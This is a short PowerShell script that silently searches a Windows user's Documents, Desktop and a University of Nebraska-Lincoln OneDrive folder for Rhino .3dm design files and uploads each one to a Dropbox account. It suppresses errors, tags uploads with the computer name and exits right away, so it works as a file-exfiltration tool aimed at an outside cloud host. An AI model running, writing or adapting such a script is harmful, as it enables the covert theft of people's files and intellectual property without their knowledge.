[Console]::WindowWidth = 80
[Console]::WindowHeight = 25
Write-Host "Script is running..." -ForegroundColor Green
# 1. Force immediate execution
$ErrorActionPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# 2. Target only .3dm files in these locations
$folders = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)

# 3. Direct file upload (no zipping)
$computer = $env:COMPUTERNAME
$headers = @{
    "Authorization" = "Bearer $db"
    "Content-Type" = "application/octet-stream"
}

foreach ($folder in $folders) {
    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File | ForEach-Object {
        $uploadArgs = @{
            "path" = "/$computer/$($_.Name)"
            "mode" = "add"
            "autorename" = $true
        } | ConvertTo-Json -Compress
        
        $headers["Dropbox-API-Arg"] = $uploadArgs
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
            Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileBytes
        } catch {}
    }
}
Write-Host "Uploads completed" -ForegroundColor Green
Start-Sleep -Seconds 30

# 4. Immediate exit (remove for debugging)
[Environment]::Exit(0)
